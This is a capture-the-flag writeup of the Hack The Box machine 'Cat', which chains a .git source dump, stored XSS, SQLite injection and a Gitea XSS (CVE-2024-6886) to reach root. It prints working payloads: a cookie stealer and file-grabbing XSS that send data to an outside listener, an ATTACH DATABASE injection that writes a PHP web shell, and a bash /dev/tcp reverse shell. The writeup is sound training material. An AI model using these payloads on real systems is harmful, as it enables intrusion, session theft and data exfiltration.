+++
date = '2026-09-28T01:27:58+02:00'
draft = false
title = 'Cat Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`07/02/2025`**

![pwn.png](/images/imgs_cat/pwn.png)

---
# Introduction

**_Cat_** is a **Medium-level Linux** box that requires meticulous source code review, input validation analysis, and vulnerability chaining.

The exploitation path begins with discovering an exposed **`.git`** directory, allowing for full source code recovery. By analyzing the backend logic, a bypass in the input sanitization leads to a **Stored XSS** vulnerability, which is used to hijack an administrator's session. Once authenticated as an admin, an **SQLite Injection** is abused via the **ATTACH DATABASE** technique to achieve **Remote Code Execution** (**RCE**).
Lateral movement involves cracking database hashes, extracting cleartext credentials from **Apache logs**, and setting up an **SSH** tunnel to access an internal **Gitea** instance. Finally, a **Stored XSS** on **Gitea** (**CVE-2024-6886**) is used to exfiltrate internal repository files, revealing hardcoded credentials that lead to **root**.

---
# Techniques Used

- **Source Code Disclosure (.git dump) & SAST (Snyk)**

- **Stored XSS & Session Hijacking**

- **SQLite Injection to RCE (ATTACH DATABASE)**

- **Password Cracking & Log Enumeration**

- **SSH Tunneling & Internal Port Forwarding**

- **Gitea Stored XSS (CVE-2024-6886) to Internal Data Exfiltration**

---
# Enumeration
## nmap

Initial scan on all ports:

```bash
nmap -p- cat.htb
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV -p 22,80 cat.htb
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://cat.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I added **`cat.htb`** to my **`/etc/hosts`** file.

## Web Enumeration

Browsing to port **`80`** revealed a cat competition application. 

![web1.png](/images/imgs_cat/web1.png)

Both the **`Contest`** and **`Join`** buttons redirected to **`/join.php`**, where users can register an account or log in.

![web2.png](/images/imgs_cat/web2.png)

I ran a **gobuster** scan against the directories, which revealed an exposed **`.git`** directory.

```bash
gobuster dir -u http://cat.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

![gob.png](/images/imgs_cat/gob.png)

I used **git-dumper** to retrieve the entire repository and access the backend source code:

```bash
git-dumper http://cat.htb/.git www
```

![gitdumper.png](/images/imgs_cat/gitdumper.png)

![git1.png](/images/imgs_cat/git1.png)

Whenever I obtain source code, I feed it to **Snyk** to scan for vulnerabilities and pinpoint interesting files for manual review.

---
# Web Exploitation | Stored XSS to Session Hijacking

The very first thing **Snyk** flagged was a **Critical SQL Injection** inside **`accept_cat.php`**. The report explicitly warned: 

```text
Unsanitized input from an HTTP parameter flows into exec, where it is used in an SQL query. This may result in an SQL Injection vulnerability.
```

![sql_snyk.png](/images/imgs_cat/sql_snyk.png)

**Note**: _**`accept_cat.php`** takes the **`catName`** parameter and passes it directly into a database query without using **prepared statements**_

However, looking at the code, this vulnerable sink was protected by an authentication check requiring admin access.

![userleak.png](/images/imgs_cat/userleak.png)

I started analyzing the rest of the application's logic. Inside **`config.php`**, I found the path to the backend database at **`/databases/cat.db`**.

![config.png](/images/imgs_cat/config.png)

Further review of **`accept_cat.php`** shed light on the administrative workflow:

```PHP
<?php
include 'config.php';
session_start();
if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) && isset($_POST['catName'])) {
            // ...[snip]...
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);

            $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
            $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
            $stmt_delete->execute();
            echo "The cat has been accepted and added successfully.";
        }
// ...
```

This code indicates that the admin (**`axel`**) manually reviews the submissions to either accept or reject the cats. This administrative interaction is a classic target for a **Stored XSS** attack to steal the admin's session cookie.

However, injecting an **XSS** payload directly into the cat registration form was restricted. Inside **`contest.php`**, I found a strict sanitization string:

```PHP
$forbidden_patterns = "/[+*{}',;<>()\\[\\]\\/\\:]/";
```

![sanitize.png](/images/imgs_cat/sanitize.png)

**Note**: _This regex strips essential characters like **`< > / :`**, rendering direct **XSS** or **Command Injection** via the cat submission form impossible._

Looking for a bypass, I realized the application likely displays the submitter's username alongside the cat's information on the admin dashboard, and crucially, **`join.php`** (where the user registers) had no such sanitization.

To test this hypothesis, I registered a new account using a blind **XSS** payload in the username field to force a callback:

```text
Username: <script src="http://10.10.15.152:22667/fall.txt"></script>
```

After logging in, I submitted a random cat to the contest. Shortly after, the admin bot reviewed the submission, triggering the payload on the dashboard. I successfully caught the request on my listener:

![xss.png](/images/imgs_cat/xss.png)

Confirming the vulnerability, I registered another user with a classic **cookie-stealer** payload:

```HTML
<script>fetch("http://10.10.15.152:22667/log?cookie=" + document.cookie)</script>
```

![xss1.png](/images/imgs_cat/xss1.png)

I received **`axel`**'s session cookie:

![xss2.png](/images/imgs_cat/xss2.png)

injected it into my browser via the developer tools, and gained access to the hidden **`Admin`** section.

![cookie2.png](/images/imgs_cat/cookie2.png)

---
# Initial Access | SQLite Injection to RCE

Now that I was authenticated as **`axel`**, I could exploit the **SQL Injection** flagged earlier by **Snyk**.
I fired up **Burp Suite** and intercepted the request to register my cat **`Meletto`**:

```text
POST /accept_cat.php HTTP/1.1
Host: cat.htb
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=2kabd53t7t2ndnpp3lbtb3lo6l

catName=Meletto&catId=1
```

![Meletto.png](/images/imgs_cat/Meletto.png)

Since the backend is **SQLite**, I referenced [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#attach-database) for an **SQLite RCE** technique utilizing **`ATTACH DATABASE`**. This feature allows an attacker to treat a **PHP** file as a writable database, create a table inside it, and insert malicious **PHP** code (a **web shell**) that gets written to the server's filesystem.

I URL-encoded the following payload and injected it into the **`catName`** parameter:

```SQL
Meletto'); ATTACH DATABASE '/var/www/cat.htb/meletto.php' AS meletto; CREATE TABLE meletto.pwn (dataz text); INSERT INTO meletto.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');--
```

![sqli.png](/images/imgs_cat/sqli.png)

I curled the newly created file to verify code execution:

```bash
curl http://cat.htb/meletto.php?cmd=id
```

![cs.png](/images/imgs_cat/cs.png)

I set up a **netcat** listener and sent a URL-encoded bash reverse shell to get initial access as **`www-data`**:

```text
http://cat.htb/meletto.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.15.152/22667+0>%261'
```

![initial.png](/images/imgs_cat/initial.png)

---
# Lateral Movement | www-data → rosa → axel

Now the first priority was inspecting the database found during the source code review.

```bash
sqlite3 /databases/cat.db
sqlite> .tables
sqlite> select * from users;
```

![db.png](/images/imgs_cat/db.png)

I retrieved several hashes, fed them to **CrackStation**.

![crack.png](/images/imgs_cat/crack.png)

successfully cracked the password for the user **`rosa`**: **`soyunaprincesarosa`**.

![princ.jpg](/images/imgs_cat/princ.jpg)

I **SSH**'d into the box as **`rosa`**. Although she had no **sudo** privileges, she was part of the **`adm`** group, which grants read access to system logs.

**Note**: _The **`adm`** group in **Linux** is typically used for system monitoring tasks and allows users to read log files in **`/var/log`** without requiring **root** access._

I analyzed the **Apache** logs and found cleartext credentials for the user **axel** passed in a **GET** request:

```bash
cat /var/log/apache2/access.log | grep axel
```

![pass.png](/images/imgs_cat/pass.png)

At first, I simply switched to the user by running **`su axel`** from my current session and grabbed the **user flag**. 

![userf.png](/images/imgs_cat/userf.png)

---
# Privilege Escalation | CVE-2024-6886 to Internal Data Exfiltration

I felt a bit stuck and didn't immediately see a clear path forward. I transferred and launched **`linpeas.sh`** to look for automated vectors. However, while it was running in the background, I established a proper **SSH** session as **`axel`** to continue enumerating manually.

Upon logging in, the **MOTD** banner explicitly alerted me: **`You have mail`**.

![mail.png](/images/imgs_cat/mail.png)

I checked **`/var/mail/axel`** and found two messages from **`rosa`**:

```text
Hi Axel,

We are planning to launch new cat-related web services... Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service...

We are currently developing an employee management system. Each sector administrator will be assigned a specific role... The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.
```

The email hinted at a local **Gitea** service running on port **`3000`**, apparently monitored by an admin bot (**`jobert`**) checking emails sent to **`jobert@localhost`**. I set up an **SSH** tunnel to access the service:

```bash
ssh -L 3000:localhost:3000 axel@cat.htb
```

Navigating to http://localhost:3000, I tried to access the repository mentioned in the email (**`/administrator/Employee-management/`**). However, I was hit with an error:

```text
The page you are trying to reach either does not exist or you are not authorized to view it.
```

I noticed the version was exposed at the bottom of the page: **`1.22.0`**. A quick **Google** search revealed that this specific version is vulnerable to [CVE-2024-6886](https://www.exploit-db.com/exploits/52077), a **Stored XSS** vulnerability in the repository **`description`** field.

![cve.png](/images/imgs_cat/cve.png)

**So, how to weaponize this?** 

Re-reading the first part of the email, it was clear that a bot (**jobert**) manually reviews the repositories submitted via email.
I had all the pieces of the puzzle:

**`1.`** An **XSS** vector in the repository **`description`**.

**`2.`** A bot with higher privileges that will trigger the **XSS**.

**`3.`** The exact path of an internal repository I wasn't authorized to read.

I just needed the bot to fetch the content for me. I searched for an **XSS file grabber** one-liner. Since the email explicitly mentioned a **`README.md`** file, my first instinct was to target it directly.

I created a new repository named **`meletto`**, injected the payload into the **`description`** field:

```javascript
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md').then(r => r.text()).then(d => fetch('http://10.10.15.152:22667/', {method:'POST',mode:'no-cors',body:d}));">Repo</a>
```

and sent the email to the bot:

```bash
echo "http://localhost:3000/axel/meletto" | sendmail jobert@localhost
```

After a while, I caught the request on my listener and received the **`README.md`** content... but it contained absolutely nothing useful.

![readme.png](/images/imgs_cat/readme.png)

I was stuck again, so I tought to modify the payload to simply fetch the repository's **root** directory instead of a specific file:

```javascript
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/').then(r => r.text()).then(d => fetch('http://10.10.15.152:22667/', {method:'POST',mode:'no-cors',body:d}));">Repo</a>
```

I triggered the bot once more. This time, I saved the **HTML** response into a **`.html`** file and opened it in my browser. It successfully rendered the repository's file list:

![page.png](/images/imgs_cat/page.png)

The most sensitive-looking file was **`index.php`**. I modified my **XSS** payload to fetch the raw content of this specific file:

```javascript
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(r => r.text()).then(d => fetch('http://10.10.15.152:22667/', {method:'POST',mode:'no-cors',body:d}));">Repo</a>
```

I triggered the bot again and received the content of **`index.php`**, which contained hardcoded authentication credentials:

![admin.png](/images/imgs_cat/admin.png)

Since these credentials weren't valid for the **Gitea** web interface, I tried switching users directly in the **SSH** terminal using **su root**.

![rootf.png](/images/imgs_cat/rootf.png)

The password was valid, granting full **root** access to the system.

---
# Final Thoughts

This machine is an absolute gem.

This was the first **Medium** machine that I've rooted all by myself. It took me a couple of days to complete it. I agree with the **Medium** difficulty rating, even though it requires a lot of steps, so maybe it can be considered more as a **Hard** difficulty.

However, it is a great machine to properly understand **Stored XSS** and how it works under the hood. It's also excellent for practicing code reviewing to find **improper sanitization** and **SQL injections**. It is a box where every single detail is important to proceed.

**Sources**:

- **PayloadAllTheThings SQLite Injection | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#attach-database**

- **CrackStation | https://crackstation.net/**

- **Exploit-DB Gitea 1.22.0 - Stored XSS (CVE-2024-6886) | https://www.exploit-db.com/exploits/52077**
